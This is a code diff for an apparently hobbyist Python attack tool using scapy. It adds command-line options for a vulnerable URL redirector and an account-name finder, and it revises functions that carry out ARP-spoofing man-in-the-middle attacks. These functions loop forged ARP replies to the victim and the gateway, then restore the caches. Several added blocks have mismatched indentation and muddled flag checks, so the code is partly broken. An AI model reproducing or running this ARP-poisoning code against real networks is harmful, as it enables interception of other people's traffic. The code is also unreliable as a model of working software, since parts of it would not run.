@@ -18,7 +18,8 @@ from scapy.all import *
 # Import Arguments
 arg = argparse.ArgumentParser()
 arg.add_argument("--mitm",help='Man in the middle attacks',action='store_true',dest='mimt',default=False,required=False)
-arg.add_argument("--vur",help='Vulnerable url redirector',action='store_true',dest='mimt',default=False,required=False)
+arg.add_argument("--vur",help='Vulnerable url redirector',action='store_true',dest='vur',default=False,required=False)
+arg.add_argument("--fsa",help='Finding account with the same name',action='store_true',dest='fsa',default=False,required=False)
 arg = arg.parse_args()
 
 # Check
@@ -28,9 +29,19 @@ if not arg.mimt:
                 sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
             else:
                 sys.exit('[ERR] Please select an attack')
+    if arg.fsa:
+        if not cpt:
+                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
+            else:
+                sys.exit('[ERR] Please select an attack')
 
-if arg.mimt:
-    if arg.vur:
+if arg.vur:
+    if arg.mimt:
+        if not cpt:
+                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
+            else:
+                sys.exit('[ERR] Please select an attack')
+    if arg.fsa:
         if not cpt:
                 sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
             else:
@@ -69,21 +80,20 @@ def randToken():
     return e
 
 def restore():
-        print('Restoring...')
-        send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=targetMAC),count=7)
-        send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=gatewayMAC),count=7)
-        sys.exit()
+    print('Restoring...')
+    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=targetMAC),count=10,verbose=False)
+    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=gatewayMAC),count=10,verbose=False)
+    sys.exit()
 
 def mitm():
-    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = targetMAC))
-    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = gatewayMAC))
+    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = targetMAC),verbose=False)
+    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = gatewayMAC),verbose=False)
 
 if arg.mimt:
     targetIP = input('Target IP : ')
     gatewayIP = input('Gateway IP : ')
     targetMAC = getmacbyip(targetIP)
     gatewayMAC = getmacbyip(gatewayIP)
-
     try:
         while True:
             mitm()
@@ -117,3 +127,7 @@ Option :
     else:
         print('[INF] Output : '+url)
 
+elif arg.fsa:
+    acn = input('Account Name : ')
+    afind(acn)
+    
